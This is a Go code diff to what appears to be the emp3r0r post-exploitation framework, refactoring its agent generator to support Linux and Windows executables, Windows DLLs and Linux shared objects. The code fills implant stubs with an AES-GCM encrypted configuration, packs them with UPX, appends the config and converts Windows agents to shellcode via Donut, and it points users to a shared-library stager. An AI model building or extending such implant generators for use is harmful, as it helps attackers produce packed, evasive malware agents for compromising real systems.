@@ -17,7 +17,24 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
+const (
+	PayloadTypeLinuxExecutable   = "linux_executable"
+	PayloadTypeWindowsExecutable = "windows_executable"
+	PayloadTypeWindowsDLL        = "windows_dll"
+	PayloadTypeLinuxSO           = "linux_so"
+)
+
 var Arch_List_Windows = []string{
+	"386",
+	"amd64",
+}
+
+var Arch_List_Windows_DLL = []string{
+	"386",
+	"amd64",
+}
+
+var Arch_List_Linux_SO = []string{
 	"386",
 	"amd64",
 }
@@ -40,12 +57,12 @@ func modGenAgent() {
 	)
 	now := time.Now()
 	stubFile := ""
-	osOpt, ok := Options["os"]
+	payloadTypeOpt, ok := Options["type"]
 	if !ok {
-		CliPrintError("Option 'os' not found")
+		CliPrintError("Option 'type' not found")
 		return
 	}
-	os_choice := osOpt.Val
+	payload_type := payloadTypeOpt.Val
 
 	archOpt, ok := Options["arch"]
 	if !ok {
@@ -53,52 +70,13 @@ func modGenAgent() {
 		return
 	}
 	arch_choice = archOpt.Val
-	is_arch_valid := func(arch string) bool {
-		list := Arch_List_All
-		if os_choice == "windows" {
-			list = Arch_List_Windows
-		}
-		for _, a := range list {
-			if arch == a {
-				return true
-			}
-		}
-		return false
-	}
 
-	switch os_choice {
-	case "linux":
-		CliPrintInfo("You chose Linux")
-		if !is_arch_valid(arch_choice) {
-			CliPrintError("Invalid arch choice")
-			return
-		}
-		CliPrintInfo("Generating agent for %s platform", arch_choice)
-		stubFile = fmt.Sprintf("%s-%s", emp3r0r_def.Stub_Linux, arch_choice)
-		outfile = fmt.Sprintf("%s/agent_linux_%s_%d-%d-%d_%d-%d-%d",
-			EmpWorkSpace, arch_choice,
-			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
-	case "windows":
-		CliPrintInfo("You chose Windows")
-		if !is_arch_valid(arch_choice) {
-			CliPrintError("Invalid arch choice")
-			return
-		}
-		stubFile = fmt.Sprintf("%s-%s", emp3r0r_def.Stub_Windows, arch_choice)
-		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.exe",
-			EmpWorkSpace, arch_choice,
-			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
-	case "dll":
-		CliPrintInfo("You chose Windows DLL")
-		stubFile = fmt.Sprintf("%s-%s", emp3r0r_def.Stub_Windows_DLL, arch_choice)
-		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.dll",
-			EmpWorkSpace, arch_choice,
-			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
-
-	default:
-		CliPrintError("Unsupported OS: %s", os_choice)
+	if !isArchValid(payload_type, arch_choice) {
+		CliPrintError("Invalid arch choice")
 		return
 	}
+
+	stubFile, outfile = generateFilePaths(payload_type, arch_choice, now)
 
 	// is this stub file available?
 	if !util.IsExist(stubFile) {
@@ -107,27 +85,19 @@ func modGenAgent() {
 	}
 
 	// fill emp3r0r.json
-	err := MakeConfig()
-	if err != nil {
+	if err := MakeConfig(); err != nil {
 		CliPrintError("Failed to configure agent: %v", err)
 		return
 	}
 
-	// read file
-	jsonBytes, err := os.ReadFile(EmpConfigFile)
-	if err != nil {
-		CliPrintError("Parsing EmpConfigFile config file: %v", err)
-		return
-	}
-
-	// encrypt
-	encryptedJSONBytes, err := tun.AES_GCM_Encrypt(emp3r0r_def.OneTimeMagicBytes, jsonBytes)
+	// read and encrypt config file
+	encryptedJSONBytes, err := readAndEncryptConfig()
 	if err != nil {
 		CliPrintError("Failed to encrypt %s: %v", EmpConfigFile, err)
 		return
 	}
 
-	// write
+	// read stub file
 	toWrite, err := os.ReadFile(stubFile)
 	if err != nil {
 		CliPrintError("Read stub: %v", err)
@@ -149,8 +119,7 @@ func modGenAgent() {
 		return
 	}
 	// write
-	err = os.WriteFile(outfile, toWrite, 0o755)
-	if err != nil {
+	if err = os.WriteFile(outfile, toWrite, 0o755); err != nil {
 		CliPrintError("Save agent binary %s: %v", outfile, err)
 		return
 	}
@@ -162,20 +131,18 @@ func modGenAgent() {
 	agent_binary_path = outfile
 
 	packed_file := fmt.Sprintf("%s.packed", outfile)
-	if os_choice == "windows" {
+	if payload_type == PayloadTypeWindowsExecutable {
 		packed_file = fmt.Sprintf("%s.packed.exe", outfile)
 	}
 
 	// pack it with upx
-	err = upx(outfile, packed_file)
-	if err != nil {
+	if err = upx(outfile, packed_file); err != nil {
 		CliPrintWarning("UPX: %v", err)
 		return
 	}
 
 	// append magic_str so it will still extract config data
-	err = appendConfigToPayload(packed_file, sep, encryptedJSONBytes)
-	if err != nil {
+	if err = appendConfigToPayload(packed_file, sep, encryptedJSONBytes); err != nil {
 		CliPrintError("Failed to append config to packed binary: %v", err)
 		return
 	}
@@ -183,15 +150,83 @@ func modGenAgent() {
 	agent_binary_path = packed_file
 	CliPrint("Generated agent binary: %s.", agent_binary_path)
 
-	if os_choice == "windows" {
+	if payload_type == PayloadTypeWindowsExecutable {
 		// generate shellcode for the agent binary
 		DonoutPE2Shellcode(outfile, arch_choice)
 		appendConfigToPayload(outfile+".bin", sep, encryptedJSONBytes)
 	}
-	if os_choice == "linux" {
+	if payload_type == PayloadTypeLinuxExecutable {
 		// tell user to use shared library stager
 		CliPrint("Navigate to `loader/elf` and run `make stager_so` to generate shared library stager, don't forget to modify `stager.c` to fit your needs. You will need another stager to load the shared library.")
 	}
+}
+
+func isArchValid(payload_type, arch_choice string) bool {
+	var list []string
+	switch payload_type {
+	case PayloadTypeWindowsExecutable:
+		list = Arch_List_Windows
+	case PayloadTypeWindowsDLL:
+		list = Arch_List_Windows_DLL
+	case PayloadTypeLinuxSO:
+		list = Arch_List_Linux_SO
+	default:
+		list = Arch_List_All
+	}
+	for _, a := range list {
+		if arch_choice == a {
+			return true
+		}
+	}
+	return false
+}
+
+func generateFilePaths(payload_type, arch_choice string, now time.Time) (stubFile, outfile string) {
+	switch payload_type {
+	case PayloadTypeLinuxExecutable:
+		CliPrintInfo("You chose Linux Executable")
+		stubFile = fmt.Sprintf("stub-%s", arch_choice)
+		outfile = fmt.Sprintf("%s/agent_linux_%s_%d-%d-%d_%d-%d-%d",
+			EmpWorkSpace, arch_choice,
+			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
+	case PayloadTypeWindowsExecutable:
+		CliPrintInfo("You chose Windows Executable")
+		stubFile = fmt.Sprintf("stub-win-%s", arch_choice)
+		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.exe",
+			EmpWorkSpace, arch_choice,
+			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
+	case PayloadTypeWindowsDLL:
+		CliPrintInfo("You chose Windows DLL")
+		stubFile = fmt.Sprintf("stub-win-%s.dll", arch_choice)
+		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.dll",
+			EmpWorkSpace, arch_choice,
+			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
+	case PayloadTypeLinuxSO:
+		CliPrintInfo("You chose Linux SO")
+		stubFile = fmt.Sprintf("stub-%s.so", arch_choice)
+		outfile = fmt.Sprintf("%s/agent_linux_so_%s_%d-%d-%d_%d-%d-%d.so",
+			EmpWorkSpace, arch_choice,
+			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
+	default:
+		CliPrintError("Unsupported: %s", payload_type)
+	}
+	return
+}
+
+func readAndEncryptConfig() ([]byte, error) {
+	// read file
+	jsonBytes, err := os.ReadFile(EmpConfigFile)
+	if err != nil {
+		return nil, fmt.Errorf("Parsing EmpConfigFile config file: %v", err)
+	}
+
+	// encrypt
+	encryptedJSONBytes, err := tun.AES_GCM_Encrypt(emp3r0r_def.OneTimeMagicBytes, jsonBytes)
+	if err != nil {
+		return nil, fmt.Errorf("Failed to encrypt %s: %v", EmpConfigFile, err)
+	}
+
+	return encryptedJSONBytes, nil
 }
 
 func appendConfigToPayload(file string, sep, config []byte) (err error) {
